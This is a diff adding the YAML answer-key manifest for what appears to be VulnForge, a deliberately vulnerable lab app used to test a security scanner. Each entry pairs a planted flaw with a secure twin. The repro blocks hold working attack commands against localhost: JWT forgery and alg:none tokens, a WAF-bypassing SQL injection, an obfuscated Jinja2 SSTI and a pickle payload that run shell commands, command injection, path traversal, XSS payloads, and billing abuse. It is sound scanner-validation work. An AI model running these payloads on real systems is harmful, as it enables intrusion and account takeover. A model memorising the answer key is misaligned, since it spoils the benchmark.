@@ -1,0 +1,1627 @@
+# =============================================================================
+# VulnForge ground-truth manifest - THE ANSWER KEY.
+#
+# Law 1: No vuln without a manifest entry; no manifest entry without a working
+#        vuln. App code + this file are one unit; they land together.
+# Law 2: Every intentional vuln has an exploit test (it FIRES); every secured
+#        twin has a control test (it HOLDS). `python tools/verify.py` enforces both.
+#
+# Schema: ground-truth/manifest.schema.json (validated by verify.py).
+#
+# tier: 1 = must-catch-today (the real validation scorecard)
+#       2 = aspirational-modern (coverage roadmap; scanner may not find it yet)
+# =============================================================================
+entries:
+  - id: API-BOLA-001
+    title: Project detail cross-tenant BOLA (no org-ownership check)
+    class: BOLA
+    cwe: CWE-639
+    owasp: "API1:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/projects/{id}"
+    severity: High
+    auth: cross-tenant
+    detector: diver_idor_bac
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-BOLA-001-SAFE
+    intentional: true
+    repro: |
+      # alice (org 1) reads a Globex (org 2) project via a sequential id.
+      # Token comes from the real web login flow (cookie -> Bearer exchange):
+      curl http://localhost:8081/api/projects/4 -H "Authorization: Bearer <alice_token>"
+      # -> 200 with project 4 (orgId=2) - not alice's org.
+
+  - id: API-BOLA-001-SAFE
+    title: Project detail with enforced org-ownership (secure twin)
+    class: BOLA
+    cwe: CWE-639
+    owasp: "API1:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/projects/{id}"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-MASSASSIGN-001
+    title: Profile update mass assignment (self privilege escalation to super-admin)
+    class: MassAssignment
+    cwe: CWE-915
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "PATCH /api/me"
+    severity: Critical
+    auth: user
+    detector: diver_mass_assignment
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-MASSASSIGN-001-SAFE
+    intentional: true
+    repro: |
+      # charlie (org 1, role=member) promotes himself by binding server-owned fields.
+      # Token comes from the real web login flow (cookie -> Bearer exchange):
+      curl -X PATCH http://localhost:8081/api/me \
+        -H "Authorization: Bearer <charlie_token>" \
+        -H "Content-Type: application/json" \
+        -d '{"role":"owner","isSuperAdmin":true}'
+      # -> 200; GET /api/me now reports role=owner, isSuperAdmin=true.
+
+  - id: API-MASSASSIGN-001-SAFE
+    title: Profile update with an allowlist of editable fields (secure twin)
+    class: MassAssignment
+    cwe: CWE-915
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "PATCH /api/me"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-JWT-001
+    title: Weak HMAC signing secret enables Bearer-token forgery (no login)
+    class: BrokenAuthentication
+    cwe: CWE-321
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/me"   # representative; the weak key affects all Bearer-auth routes
+    severity: Critical
+    auth: none
+    detector: diver_jwt_weak_secret
+    deterministic: true
+    # No per-endpoint secured twin: the weakness is a global signing-key config,
+    # not an authz gap. The control (a wrong-secret token is rejected) lives in
+    # the exploit test, proving verification happens and isolating the weak key.
+    secured_twin: null
+    intentional: true
+    repro: |
+      # The api signs/verifies HS256 with the guessable default secret "changeme"
+      # (api/config.py). Forge a token for the super-admin (sub=5) and call the
+      # api directly - no credentials, no web login:
+      python - <<'PY'
+      from jose import jwt
+      print(jwt.encode({"sub": "5", "iss": "vulnforge-api"}, "changeme", algorithm="HS256"))
+      PY
+      curl http://localhost:8081/api/me -H "Authorization: Bearer <forged_token>"
+      # -> 200 as superadmin@vulnforge.internal (isSuperAdmin=true).
+
+  - id: WEB-XSS-001
+    title: Stored XSS in task notes (task body rendered as raw HTML)
+    class: StoredXSS
+    cwe: CWE-79
+    owasp: "A03:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /projects/{id}"   # sink: project-detail renders task body via dangerouslySetInnerHTML
+    severity: High
+    auth: user
+    detector: diver_xss_stored
+    verification: manual   # browser-tier vuln - verified by hand in a browser (no headless test)
+    deterministic: true
+    secured_twin: WEB-XSS-001-SAFE
+    intentional: true
+    repro: |
+      # Store a payload in a task body (any authenticated org member), then open
+      # the project - the body is injected as raw HTML and executes for every
+      # org member who views it. Browser test (Playwright), not curl, proves it.
+      #   1. POST /api/projects/{id}/tasks  body={"title":"x","body":"<img src=x onerror=\"document.title='XSS_FIRED'\">"}
+      #   2. open http://localhost:8082/projects/{id}  -> document.title becomes "XSS_FIRED"
+
+  - id: WEB-XSS-001-SAFE
+    title: Task notes rendered React-escaped (secure twin)
+    class: StoredXSS
+    cwe: CWE-79
+    owasp: "A03:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /secure/projects/{id}"
+    severity: Info
+    auth: user
+    verification: manual
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WEB-DOMXSS-001
+    title: DOM-based XSS via URL fragment written to innerHTML (help search)
+    class: DOMXSS
+    cwe: CWE-79
+    owasp: "A03:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /search"
+    severity: High
+    auth: none
+    detector: diver_xss_dom
+    verification: manual
+    deterministic: true
+    secured_twin: WEB-DOMXSS-001-SAFE
+    intentional: true
+    repro: |
+      # The fragment (never sent to the server) is injected via innerHTML.
+      # Open in a browser:
+      http://localhost:8082/search#<img src=x onerror="alert(document.domain)">
+      # -> the onerror handler runs (DOM XSS).
+
+  - id: WEB-DOMXSS-001-SAFE
+    title: Help search rendered with textContent (secure twin)
+    class: DOMXSS
+    cwe: CWE-79
+    owasp: "A03:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /secure/search"
+    severity: Info
+    auth: none
+    verification: manual
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WEB-SECRET-001
+    title: Secret API key hardcoded in client code ships in the JS bundle
+    class: SecretsInBundle
+    cwe: CWE-615
+    owasp: "A02:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /pricing"
+    severity: High
+    auth: none
+    detector: diver_secrets_in_bundle
+    verification: manual
+    deterministic: true
+    secured_twin: WEB-SECRET-001-SAFE
+    intentional: true
+    repro: |
+      # The secret is embedded in a 'use client' module, so it ships to the browser.
+      # Load /pricing, then grep the served JS chunk(s):
+      curl -s http://localhost:8082/pricing | grep -o '/_next/[^"]*\.js' | \
+        while read u; do curl -s "http://localhost:8082$u"; done | grep VULNFORGE_FAKE
+      # -> sk_live_VULNFORGE_FAKE_9f3a1c7b_DO_NOT_USE (secret recovered from the bundle)
+
+  - id: WEB-SECRET-001-SAFE
+    title: Pricing with only a publishable key client-side (secure twin)
+    class: SecretsInBundle
+    cwe: CWE-615
+    owasp: "A02:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /secure/pricing"
+    severity: Info
+    auth: none
+    verification: manual
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WEB-PROTO-001
+    title: Prototype pollution via unsafe deep-merge of user config
+    class: PrototypePollution
+    cwe: CWE-1321
+    owasp: "A03:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /customize"
+    severity: High
+    auth: none
+    detector: diver_prototype_pollution
+    verification: manual
+    deterministic: true
+    secured_twin: WEB-PROTO-001-SAFE
+    intentional: true
+    repro: |
+      # A config with __proto__ poisons Object.prototype for the whole page.
+      # Open in a browser:
+      http://localhost:8082/customize?config={"__proto__":{"polluted":"PP_FIRED"}}
+      # -> the page reports Object.prototype now carries polluted=PP_FIRED.
+
+  - id: WEB-PROTO-001-SAFE
+    title: Customize with a __proto__-guarded merge (secure twin)
+    class: PrototypePollution
+    cwe: CWE-1321
+    owasp: "A03:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /secure/customize"
+    severity: Info
+    auth: none
+    verification: manual
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: WEB-CLICKJACK-001
+    title: Sensitive action page is framable (no X-Frame-Options / frame-ancestors)
+    class: Clickjacking
+    cwe: CWE-1021
+    owasp: "A05:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /embed"
+    severity: Medium
+    auth: none
+    detector: diver_clickjacking
+    deterministic: true
+    secured_twin: WEB-CLICKJACK-001-SAFE
+    intentional: true
+    repro: |
+      # No framing protection -> the page can be overlaid in a transparent iframe.
+      curl -sI http://localhost:8082/embed | grep -i -E 'x-frame-options|frame-ancestors'
+      # -> (no output: neither header is set)
+
+  - id: WEB-CLICKJACK-001-SAFE
+    title: Sensitive action page frame-protected (secure twin)
+    class: Clickjacking
+    cwe: CWE-1021
+    owasp: "A05:2021"
+    tier: 1
+    origin: web
+    endpoint: "GET /secure/embed"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-BFLA-001
+    title: Org audit log readable by any member (missing admin function-level check)
+    class: BFLA
+    cwe: CWE-862
+    owasp: "API5:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/admin/audit"
+    severity: High
+    auth: user
+    detector: diver_bfla
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-BFLA-001-SAFE
+    intentional: true
+    repro: |
+      # charlie (org 1, role=member) reads the admin-only audit log.
+      # Token comes from the real web login flow (cookie -> Bearer exchange):
+      curl http://localhost:8081/api/admin/audit -H "Authorization: Bearer <charlie_token>"
+      # -> 200 with org 1's audit entries - members must not see this.
+
+  - id: API-BFLA-001-SAFE
+    title: Org audit log with enforced admin check (secure twin)
+    class: BFLA
+    cwe: CWE-862
+    owasp: "API5:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/admin/audit"
+    severity: Info
+    auth: admin
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-SSRF-001
+    title: Link-preview SSRF reaches internal cloud-metadata sink
+    class: SSRF
+    cwe: CWE-918
+    owasp: "API7:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/projects/{id}/link-preview"
+    severity: Critical
+    auth: user
+    detector: diver_ssrf
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-SSRF-001-SAFE
+    intentional: true
+    repro: |
+      # The preview endpoint fetches a user-supplied URL with no validation.
+      # Point it at the internal metadata sink (stands in for 169.254.169.254);
+      # the server fetches it and returns the (fake) credentials.
+      curl -X POST http://localhost:8081/api/projects/1/link-preview \
+        -H "Authorization: Bearer <alice_token>" \
+        -H "Content-Type: application/json" \
+        -d '{"url":"http://localhost:8081/internal/cloud-metadata"}'
+      # -> 200 with body containing AKIAFAKE_VULNFORGE_SSRF (internal creds leaked).
+
+  - id: API-SSRF-001-SAFE
+    title: Link-preview with scheme + private-address blocking (secure twin)
+    class: SSRF
+    cwe: CWE-918
+    owasp: "API7:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/projects/{id}/link-preview"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-SQLI-001
+    title: SQL injection in project search (cross-tenant read, behind a signature WAF)
+    class: SQLInjection
+    cwe: CWE-89
+    owasp: "A03:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/projects/search"
+    severity: Critical
+    auth: user
+    detector: diver_sqli
+    gating: VF_HARDENED
+    defense: signature-waf
+    deterministic: true
+    secured_twin: API-SQLI-001-SAFE
+    intentional: true
+    repro: |
+      # q is concatenated into the SQL. A signature WAF blocks the canonical
+      # `' OR '1'='1' --` (403), so pivot to a UNION SELECT (no OR, no comment):
+      curl -G http://localhost:8081/api/projects/search \
+        -H "Authorization: Bearer <alice_token>" \
+        --data-urlencode "q=' UNION SELECT id,org_id,name,description,status FROM projects WHERE name LIKE '"
+      # -> 200 with projects from every org (org_id filter bypassed cross-tenant).
+
+  - id: API-SQLI-001-SAFE
+    title: Project search with a parameterized query (secure twin)
+    class: SQLInjection
+    cwe: CWE-89
+    owasp: "A03:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/projects/search"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-EXCESSDATA-001
+    title: User detail over-exposes password_hash and internal_notes (read-side BOPLA)
+    class: ExcessiveDataExposure
+    cwe: CWE-200
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/users/{id}"
+    severity: High
+    auth: user
+    detector: diver_excessive_data
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-EXCESSDATA-001-SAFE
+    intentional: true
+    repro: |
+      # alice (org 1) reads another org-1 user's full record - hash + internal note.
+      curl http://localhost:8081/api/users/5 -H "Authorization: Bearer <alice_token>"
+      # -> 200 with passwordHash ($2b$...) and internalNotes in the body.
+
+  - id: API-EXCESSDATA-001-SAFE
+    title: User detail with a safe projection (secure twin)
+    class: ExcessiveDataExposure
+    cwe: CWE-200
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/users/{id}"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-REDIRECT-001
+    title: Open redirect on post-login continue endpoint (unvalidated redirect_uri)
+    class: OpenRedirect
+    cwe: CWE-601
+    owasp: "A01:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/auth/continue"
+    severity: Medium
+    auth: none
+    detector: diver_open_redirect
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-REDIRECT-001-SAFE
+    intentional: true
+    repro: |
+      # The continue endpoint redirects to any target, enabling phishing bounces:
+      curl -i "http://localhost:8081/api/auth/continue?next=https://evil.example/phish"
+      # -> 307 with Location: https://evil.example/phish
+
+  - id: AUTH-REDIRECT-001-SAFE
+    title: Continue endpoint restricted to same-origin relative paths (secure twin)
+    class: OpenRedirect
+    cwe: CWE-601
+    owasp: "A01:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/auth/continue"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-JWT-002
+    title: JWT signature not verified (alg:none / unsigned token accepted)
+    class: JWTSignatureBypass
+    cwe: CWE-347
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/v1/profile"
+    severity: Critical
+    auth: none
+    detector: diver_jwt_alg_none
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-JWT-002-SAFE
+    intentional: true
+    repro: |
+      # Forge an UNSIGNED (alg:none) token for the super-admin (sub=5) - no key:
+      #   header  = base64url({"alg":"none","typ":"JWT"})
+      #   payload = base64url({"sub":"5","iss":"vulnforge-api"})
+      #   token   = header + "." + payload + "."     (empty signature)
+      curl http://localhost:8081/api/v1/profile -H "Authorization: Bearer <none_token>"
+      # -> 200 as superadmin (signature never checked).
+
+  - id: AUTH-JWT-002-SAFE
+    title: Legacy profile reader with proper signature verification (secure twin)
+    class: JWTSignatureBypass
+    cwe: CWE-347
+    owasp: "API2:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/v1/profile"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-RESET-001
+    title: Predictable password-reset token enables account takeover
+    class: PredictableToken
+    cwe: CWE-330
+    owasp: "A02:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/auth/reset/confirm"
+    severity: Critical
+    auth: none
+    detector: diver_weak_token
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-RESET-001-SAFE
+    intentional: true
+    repro: |
+      # The reset token is md5(email). Attacker resets a victim by guessing it:
+      python -c "import hashlib;print(hashlib.md5(b'bob@globex.test').hexdigest())"
+      curl -X POST http://localhost:8081/api/auth/reset/confirm \
+        -H "Content-Type: application/json" \
+        -d '{"email":"bob@globex.test","token":"<md5>","newPassword":"Pwned1!"}'
+      # -> 200; victim's password is now the attacker's.
+
+  - id: AUTH-RESET-001-SAFE
+    title: Password reset with a random stored token (secure twin)
+    class: PredictableToken
+    cwe: CWE-330
+    owasp: "A02:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/auth/reset/confirm"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-RACE-001
+    title: TOCTOU race lets a single-use coupon be redeemed multiple times
+    class: RaceCondition
+    cwe: CWE-362
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/coupons/{code}/redeem"
+    severity: High
+    auth: user
+    detector: diver_race
+    gating: VF_HARDENED
+    deterministic: false
+    secured_twin: API-RACE-001-SAFE
+    intentional: true
+    repro: |
+      # Fire many concurrent redeems of a 1-use coupon; several succeed.
+      seq 20 | xargs -P20 -I{} curl -s -X POST \
+        http://localhost:8081/api/coupons/WELCOME50/redeem \
+        -H "Authorization: Bearer <token>"
+      # -> more than one {"redeemed": true} (single-use redeemed multiple times).
+
+  - id: API-RACE-001-SAFE
+    title: Coupon redeem with an atomic conditional decrement (secure twin)
+    class: RaceCondition
+    cwe: CWE-362
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/coupons/{code}/redeem"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-SSTI-001
+    title: Server-side template injection in notification preview (RCE, behind a keyword WAF)
+    class: SSTI
+    cwe: CWE-1336
+    owasp: "A03:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/notifications/preview"
+    severity: Critical
+    auth: user
+    detector: diver_ssti
+    gating: VF_HARDENED
+    defense: keyword-waf
+    deterministic: true
+    secured_twin: API-SSTI-001-SAFE
+    intentional: true
+    repro: |
+      # The preview renders an attacker-controlled Jinja2 template -> RCE, but a
+      # keyword WAF blocks the naive dunder payload (403). Bypass it with Jinja2
+      # '~' string-concat that splits the blocked substrings (__/globals/popen):
+      curl -X POST http://localhost:8081/api/notifications/preview \
+        -H "Authorization: Bearer <alice_token>" -H "Content-Type: application/json" \
+        -d '{"template":"{{ cycler|attr(\"_\"~\"_init\"~\"_\"~\"_\")|attr(\"_\"~\"_glo\"~\"bals\"~\"_\"~\"_\")|attr(\"_\"~\"_getitem\"~\"_\"~\"_\")(\"os\")|attr(\"po\"~\"pen\")(\"echo VULNFORGE_RCE\")|attr(\"read\")() }}"}'
+      # -> 200 with the command output; the naive cycler.__init__.__globals__... is 403.
+
+  - id: API-SSTI-001-SAFE
+    title: Notification preview rendered in a Jinja2 sandbox (secure twin)
+    class: SSTI
+    cwe: CWE-1336
+    owasp: "A03:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/notifications/preview"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-DESERIAL-001
+    title: Insecure deserialization of untrusted pickle (RCE)
+    class: InsecureDeserialization
+    cwe: CWE-502
+    owasp: "A08:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/preferences/import"
+    severity: Critical
+    auth: user
+    detector: diver_deserialization
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-DESERIAL-001-SAFE
+    intentional: true
+    repro: |
+      # A pickle whose __reduce__ returns (eval, (code,)) runs on load:
+      python -c "import pickle,base64; \
+        class E:\n  def __reduce__(self): return (eval, (\"__import__('os').popen('id').read()\",))\n; \
+        print(base64.b64encode(pickle.dumps(E())).decode())"
+      curl -X POST http://localhost:8081/api/preferences/import \
+        -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+        -d '{"data":"<base64 pickle>"}'
+      # -> 200 with the command output in "value".
+
+  - id: API-DESERIAL-001-SAFE
+    title: Preferences import via a restricted unpickler (secure twin)
+    class: InsecureDeserialization
+    cwe: CWE-502
+    owasp: "A08:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/preferences/import"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-MISCONFIG-001
+    title: Debug endpoint left enabled leaks JWT signing secret (security misconfig)
+    class: SecurityMisconfiguration
+    cwe: CWE-489
+    owasp: "API8:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/debug/config"
+    severity: High
+    auth: none
+    detector: diver_misconfig
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-MISCONFIG-001-SAFE
+    intentional: true
+    repro: |
+      # Unauthenticated debug route dumps the signing secret -> forge any token.
+      curl http://localhost:8081/api/debug/config
+      # -> {"jwtSecret":"changeme", ...}; then mint a super-admin token (see AUTH-JWT-001).
+
+  - id: API-MISCONFIG-001-SAFE
+    title: Debug config admin-gated and redacted (secure twin)
+    class: SecurityMisconfiguration
+    cwe: CWE-489
+    owasp: "API8:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/debug/config"
+    severity: Info
+    auth: admin
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-RESOURCE-001
+    title: Unbounded limit parameter enables resource-exhaustion (no pagination cap)
+    class: ResourceConsumption
+    cwe: CWE-770
+    owasp: "API4:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/events"
+    severity: Medium
+    auth: user
+    detector: diver_resource_consumption
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-RESOURCE-001-SAFE
+    intentional: true
+    repro: |
+      # No upper bound on limit; the server materializes everything requested.
+      curl "http://localhost:8081/api/events?limit=10000000" -H "Authorization: Bearer <token>"
+      # -> a response with 10,000,000 items (memory/CPU/bandwidth blowup).
+
+  - id: API-RESOURCE-001-SAFE
+    title: Event feed with a clamped limit (secure twin)
+    class: ResourceConsumption
+    cwe: CWE-770
+    owasp: "API4:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/events"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-CMDI-001
+    title: OS command injection in diagnostics ping (shell=True interpolation)
+    class: CommandInjection
+    cwe: CWE-78
+    owasp: "A03:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/admin/diagnostics/ping"
+    severity: Critical
+    auth: admin
+    detector: diver_command_injection
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-CMDI-001-SAFE
+    intentional: true
+    repro: |
+      # The host is interpolated into a shell command; chain another with '&'.
+      curl -X POST http://localhost:8081/api/admin/diagnostics/ping \
+        -H "Authorization: Bearer <admin_token>" -H "Content-Type: application/json" \
+        -d '{"host":"127.0.0.1 & echo VULNFORGE_CMDI"}'
+      # -> 200 with VULNFORGE_CMDI in the output (injected command ran).
+
+  - id: API-CMDI-001-SAFE
+    title: Diagnostics ping with no shell, host as a single argv (secure twin)
+    class: CommandInjection
+    cwe: CWE-78
+    owasp: "A03:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/admin/diagnostics/ping"
+    severity: Info
+    auth: admin
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-PATHTRAV-001
+    title: Path traversal in attachment download reads arbitrary host files
+    class: PathTraversal
+    cwe: CWE-22
+    owasp: "A01:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/attachments"
+    severity: High
+    auth: user
+    detector: diver_path_traversal
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-PATHTRAV-001-SAFE
+    intentional: true
+    repro: |
+      # The name is joined onto the base dir with no containment check.
+      curl "http://localhost:8081/api/attachments?name=../api/config.py" \
+        -H "Authorization: Bearer <token>"
+      # -> 200 with the contents of api/config.py (leaks JWT_SECRET).
+
+  - id: API-PATHTRAV-001-SAFE
+    title: Attachment download confined to the base directory (secure twin)
+    class: PathTraversal
+    cwe: CWE-22
+    owasp: "A01:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/attachments"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-CORS-001
+    title: Permissive CORS reflects any origin with credentials
+    class: CORSMisconfiguration
+    cwe: CWE-942
+    owasp: "A05:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/widget/config"
+    severity: Medium
+    auth: none
+    detector: diver_cors
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-CORS-001-SAFE
+    intentional: true
+    repro: |
+      # The endpoint reflects the request Origin and allows credentials.
+      curl -i http://localhost:8081/api/widget/config -H "Origin: https://evil.example"
+      # -> Access-Control-Allow-Origin: https://evil.example
+      #    Access-Control-Allow-Credentials: true
+
+  - id: API-CORS-001-SAFE
+    title: Widget config CORS restricted to an allowlist (secure twin)
+    class: CORSMisconfiguration
+    cwe: CWE-942
+    owasp: "A05:2021"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/widget/config"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: AUTH-BRUTE-001
+    title: No rate limiting on authentication enables credential brute force
+    class: BruteForce
+    cwe: CWE-307
+    owasp: "A07:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/auth/login-attempt"
+    severity: High
+    auth: none
+    detector: diver_brute_force
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: AUTH-BRUTE-001-SAFE
+    intentional: true
+    repro: |
+      # Unlimited guesses - no lockout, throttle, or backoff.
+      for i in $(seq 50); do
+        curl -s -o /dev/null -w "%{http_code}\n" -X POST \
+          http://localhost:8081/api/auth/login-attempt \
+          -H "Content-Type: application/json" \
+          -d '{"email":"alice@acme.test","password":"guess'$i'"}'
+      done   # -> 50x 401, never 429
+
+  - id: AUTH-BRUTE-001-SAFE
+    title: Login attempts with per-account lockout (secure twin)
+    class: BruteForce
+    cwe: CWE-307
+    owasp: "A07:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/auth/login-attempt"
+    severity: Info
+    auth: none
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  # ---- Chained business-logic abuse (Phase 5b): discover-then-exploit --------
+  - id: API-BIZ-EXPOSE-001
+    title: Order detail over-exposes internal integer id (chain discovery step)
+    class: ExcessiveDataExposure
+    cwe: CWE-200
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/billing/orders/{public_id}"
+    severity: Medium
+    auth: user
+    detector: diver_excessive_data
+    gating: VF_HARDENED
+    chain: CHAIN-BILLING-001
+    deterministic: true
+    secured_twin: API-BIZ-EXPOSE-001-SAFE
+    intentional: true
+    repro: |
+      # The product API only exposes opaque order ids (ord_...). This detail
+      # route leaks the internal integer PK - the primitive the refund chain needs.
+      curl http://localhost:8081/api/billing/orders/<ord_id> -H "Authorization: Bearer <token>"
+      # -> {"order":{"id":"ord_...","internalId":7,...}}
+
+  - id: API-BIZ-EXPOSE-001-SAFE
+    title: Order detail with opaque id only (secure twin)
+    class: ExcessiveDataExposure
+    cwe: CWE-200
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "GET /api/billing/orders/{public_id}"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-BIZ-REFUND-001
+    title: Unbounded refund by internal id inflates credit balance (business-logic chain)
+    class: BusinessLogicAbuse
+    cwe: CWE-840
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/refund"
+    severity: Critical
+    auth: user
+    detector: diver_business_logic
+    gating: VF_HARDENED
+    chain: CHAIN-BILLING-001
+    deterministic: true
+    prerequisite: API-BIZ-EXPOSE-001
+    secured_twin: API-BIZ-REFUND-001-SAFE
+    intentional: true
+    repro: |
+      # Step 1 (prereq, API-BIZ-EXPOSE-001): learn an order's internalId.
+      # Step 2: refund an arbitrary amount to your own org balance - no cap,
+      # no ownership/status/idempotency check:
+      curl -X POST http://localhost:8081/api/billing/refund \
+        -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+        -d '{"orderId":<internalId>,"amountCents":99999999}'
+      # -> creditBalance jumps by 99999999.
+
+  - id: API-BIZ-REFUND-001-SAFE
+    title: Refund by opaque id, ownership + state + cap + idempotency (secure twin)
+    class: BusinessLogicAbuse
+    cwe: CWE-840
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/refund"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-BIZ-FREEORDER-001
+    title: Mass-assigned order import mints credits for free (crAPI free-item)
+    class: MassAssignment
+    cwe: CWE-915
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/orders/import"
+    severity: Critical
+    auth: user
+    detector: diver_mass_assignment
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-BIZ-FREEORDER-001-SAFE
+    intentional: true
+    repro: |
+      # Import an "already fulfilled" order with a huge credits value - no payment.
+      curl -X POST http://localhost:8081/api/billing/orders/import \
+        -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+        -d '{"kind":"credit_pack","status":"fulfilled","credits":1000000,"amountCents":0}'
+      # -> credit balance += 1,000,000 for $0.
+
+  - id: API-BIZ-FREEORDER-001-SAFE
+    title: Product order create computes price/credits/status server-side (secure twin)
+    class: MassAssignment
+    cwe: CWE-915
+    owasp: "API3:2023"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/orders"
+    severity: Info
+    auth: user
+    deterministic: true
+    secured_twin: null
+    intentional: false
+
+  - id: API-BIZ-COUPON-001
+    title: Coupon discount applied without consuming uses (BLA1 action-limit overrun)
+    class: BusinessLogicAbuse
+    cwe: CWE-837
+    owasp: "A04:2021"
+    tier: 1
+    origin: api
+    endpoint: "POST /api/billing/orders/quick"
+    severity: High
+    auth: user
+    detector: diver_business_logic
+    gating: VF_HARDENED
+    deterministic: true
+    secured_twin: API-BIZ-COUPON-001-SAFE
+    intentional: true
+    repro: |
+      # SAVE20 has a limited number of uses, but this checkout never decrements
+      # them, so the discount can be applied without limit:
+      for i in $(seq 20); do
